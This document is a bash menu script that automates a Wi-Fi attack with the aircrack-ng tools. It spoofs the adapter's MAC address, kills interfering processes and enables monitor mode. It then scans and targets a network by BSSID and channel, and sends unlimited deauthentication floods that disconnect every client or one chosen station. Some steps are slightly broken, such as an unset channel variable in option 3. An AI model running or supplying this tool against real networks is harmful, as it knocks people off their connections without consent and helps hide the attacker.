#!/bin/bash

 LG='\033[1;32m' #light green
 NC='\033[0m' #no color

 printf "Follow the steps"
 
 switch=""

 printf "\n ${LG}1. Step 1 (Enabling monitoring) ${NC}\n"
 printf "\n ${LG}2. Step 2 (Monitor a specific network)${NC}\n"
 printf "\n ${LG}   Step 3 (Do either one)${NC}\n"
 printf "\n ${LG}3. Disconnect all clients${NC}\n"
 printf "\n ${LG}4. Disconnect a single client${NC}\n"
 printf "\n ${LG}5. Restart Network${NC}\n"
 printf "\n ${LG}6. Exit${NC}\n"
 printf "\n"
 read -p "Select an option: " switch
 case "$switch" in
 "1")
	 ifconfig
 
	 i=20
	 while [ $i != 0 ]
	 do
	 printf "${LG}..${NC}" 
	 sleep 0.03
	 i=`expr $i - 1`
	 done
	
	 printf "\n"
	 #Reading devicename
	 devname="USER INPUT"
	 read -p "Enter devicename: " devname
	 mdevname=$devname"mon" 

	
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 	
		sleep 0.08
 		i=`expr $i - 1`
	 done
	 
	 printf  "\n ${LG}Changing MAC${NC} \n"
	 ifconfig $devname down
	 sleep 1
	 macchanger -r $devname
	 sleep 1
	 ifconfig $devname up
	
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 
		sleep 0.19
	 	i=`expr $i - 1`
	 done

	 printf "\n ${LG}process killing${NC} \n"
	 airmon-ng check kill
	
	 
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 
		sleep 0.4
	 	i=`expr $i - 1`
	 done
	
	
	 printf " \n ${LG}Starting $devname monitor${NC} \n"
	 airmon-ng start $devname
		 
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 
		sleep 0.4
	 	i=`expr $i - 1`
	 done
	
	
	 printf "\n ${LG}Dumping${NC} \n"
	
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 
		sleep 0.1
	 	i=`expr $i - 1`
	 done
	 printf "\n"
	 airodump-ng $mdevname
	
	;;

 "2")
	
         BSSID=""
	 read -p "Enter BSSID: " BSSID
	 printf "\n"
         channel=""
	 read -p "Enter channel no.: " channel
	 printf "\n"
	 ifconfig
	 printf "\n"
	 devname=""
	 read -p "Enter devicename: " devname
	 airodump-ng -c $channel --bssid $BSSID $devname



 ;;

 "3")
	 BSSID=""
	 read -p "Enter BSSID: " BSSID
	 printf "\n"
	 ifconfig
	 printf "\n"
	 devname=""
	 read -p "Enter devicename: " devname
	 airodump-ng -c $channel --bssid $BSSID $devname
	 aireplay-ng -0 0 -a $BSSID $devname

 ;;

 "4")

	 BSSID=""
	 read -p "Enter BSSID: " BSSID
	 printf "\n"
	 station=""
	 read -p "Enter Station ID: " station
	 printf "\n"
	 ifconfig
	 printf "\n"
	 devname=""
	 read -p "Enter devicename: " devname
	 aireplay-ng -0 0 -a $BSSID -c $station $devname


 ;;

 "5")
	 ifconfig
 
	 i=20
	 while [ $i != 0 ]
	 do
	 printf "${LG}..${NC}" 
	 sleep 0.03
	 i=`expr $i - 1`
	 done
	
	 printf "\n\n"
	 devname="USER INPUT"
	 read -p "Enter devicename: " devname
	 

	printf "\n ${LG}network-manager restarting${NC}\n"

	service network-manager restart

	airmon-ng stop "$devname"
	
	sleep 1

	echo  -e "\n ${LG}Monitoring stop${NC}\n"

	echo -e "\n ${LG}Done${NC}\n"

	;;


 "6")
	exit 1
	;;
 *)
	printf "\n ${LG}Incorrect option${NC}\n"
	;;

esac















	
